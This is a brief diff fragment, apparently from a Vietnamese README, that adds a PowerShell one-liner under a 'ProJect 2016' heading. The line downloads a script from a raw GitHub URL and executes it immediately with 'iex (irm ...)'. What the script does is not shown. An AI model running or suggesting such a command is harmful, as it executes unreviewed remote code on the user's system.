@@ -119,7 +119,7 @@
 ## ProJect 2016
 
   ```php
-  
+  powershell iex (irm https://raw.githubusercontent.com/bschithanh/nguon/main/ProJect2016.ps1)
   ```
 
   Hoặc
